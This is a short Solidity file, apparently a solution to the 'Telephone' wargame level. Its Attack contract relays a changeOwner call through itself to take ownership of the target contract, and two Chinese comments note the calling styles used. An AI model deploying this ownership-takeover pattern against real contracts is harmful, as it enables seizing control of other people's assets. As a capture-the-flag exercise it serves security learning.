// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;



interface Telephone{// 这个方法ok
     function changeOwner(address _owner) external;
}

contract Attack {

    Telephone tel;
    
    function init(address add) public {
        tel=Telephone(add);
    }
  

    function init2(Telephone tel,address _owner) public {

        tel.changeOwner(_owner);// 还可以这种初始化合约  传入合约或接口 是官方推荐的项目
    }
    function attackGO(address _owner) public {
    
        tel.changeOwner(_owner);
    }
}